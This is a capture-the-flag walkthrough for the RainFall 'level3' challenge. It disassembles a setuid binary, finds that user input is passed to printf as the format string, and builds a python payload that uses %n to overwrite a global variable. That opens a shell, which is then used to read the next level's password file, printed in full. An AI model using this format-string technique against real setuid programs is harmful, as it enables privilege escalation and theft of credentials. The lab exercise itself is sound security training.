# level3 walkthrough
Given setuid binary, lets disassemble it:

    (gdb) disass main
    Dump of assembler code for function main:
    0x0804851a <+0>:	push   ebp
    0x0804851b <+1>:	mov    ebp,esp
    0x0804851d <+3>:	and    esp,0xfffffff0
    0x08048520 <+6>:	call   0x80484a4 <v>
    0x08048525 <+11>:	leave
    0x08048526 <+12>:	ret
    End of assembler dump.

Main function just calls "v" function:

    (gdb) disass v
    Dump of assembler code for function v:
    0x080484a4 <+0>:	push   ebp
    0x080484a5 <+1>:	mov    ebp,esp
    0x080484a7 <+3>:	sub    esp,0x218
    0x080484ad <+9>:	mov    eax,ds:0x8049860
    0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax
    0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200
    0x080484be <+26>:	lea    eax,[ebp-0x208]
    0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
    0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>
    0x080484cc <+40>:	lea    eax,[ebp-0x208]
    0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
    0x080484d5 <+49>:	call   0x8048390 <printf@plt>
    0x080484da <+54>:	mov    eax,ds:0x804988c
    0x080484df <+59>:	cmp    eax,0x40
    0x080484e2 <+62>:	jne    0x8048518 <v+116>
    0x080484e4 <+64>:	mov    eax,ds:0x8049880
    0x080484e9 <+69>:	mov    edx,eax
    0x080484eb <+71>:	mov    eax,0x8048600
    0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx
    0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc
    0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1
    0x08048504 <+96>:	mov    DWORD PTR [esp],eax
    0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>
    0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d
    0x08048513 <+111>:	call   0x80483c0 <system@plt>
    0x08048518 <+116>:	leave
    0x08048519 <+117>:	ret
    End of assembler dump.

This function calls safe function fgets with buffer size contol, we can't abuse that.
Normally this program would just print buffer and exit, because of the cmp instruction.
This cmp instruction checks if global variable at address 0x804988c equals 0x40 (64 decimal) value.
Lets try to examine this variable:

    (gdb) x/x 0x804988c
    0x804988c <m>:	0x00000000
    (gdb) info sym 0x804988c
    m in section .bss

This is uninitialized global variable "m", that's why it is placed in bss section and initialized with zero.
If we manage to change value of this variable we would get to another part of the program with system function call which launches shell.
If we look closer at disassembly we would spot that printf is being called with buffer provided as format string which is unsafe.
Lets try to pass printf format options to find out how we can abuse this:

    level3@RainFall:~$ ./level3
    AAAA %p %p %p %p
    AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141

Because no arguments provided to the printf function call %p parameter would print values from stack.
We can see that there are three pointers, if we skip them by just printing them out then the next address on top of the stack would be the beginning of our buffer.
So if we provide instead of "AAAA" address of "m" global variable then we can overwrite it with %n parameter:

    level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "%p%p%p%n")' > /tmp/level3/exploit
    level3@RainFall:~$ ./level3 < /tmp/level3/exploit
    �0x2000xb7fd1ac00xb7ff37d0

"%n" parameter overwrites provided address with number of bytes printed out.
To write in "m" global variable 64 value we need to find out how many bytes printf currently prints and add prefix with missing amount of random bytes:

    (gdb) b *v+59
    Breakpoint 1 at 0x80484df
    (gdb) run < /tmp/level3/exploit
    Starting program: /home/user/level3/level3 < /tmp/level3/exploit
    �0x2000xb7fd1ac00xb7ff37d0

    Breakpoint 1, 0x080484df in v ()
    (gdb) i r eax
    eax            0x1d	29

Our global variable currently holds 29 value, so wee need to prefix 35 bytes:

    level3@RainFall:~$ python -c 'print("\x8c\x98\x04\x08" + "a"*35 + "%p%p%p%n")' > /tmp/level3/exploit
    level3@RainFall:~$ cat /tmp/level3/exploit - | ./level3
    �aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0x2000xb7fd1ac00xb7ff37d0
    Wait what?!
    whoami
    level4
    cat /home/user/level4/.pass
    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

Here is our token for the next level!